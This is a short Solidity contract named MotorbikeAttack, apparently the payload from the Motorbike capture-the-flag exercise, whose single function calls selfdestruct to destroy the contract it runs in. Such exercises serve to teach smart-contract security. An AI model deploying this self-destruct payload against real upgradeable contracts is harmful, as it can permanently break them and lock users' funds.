// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract MotorbikeAttack {
    function kaboom() external {
        selfdestruct(payable(address(0)));
    }
}
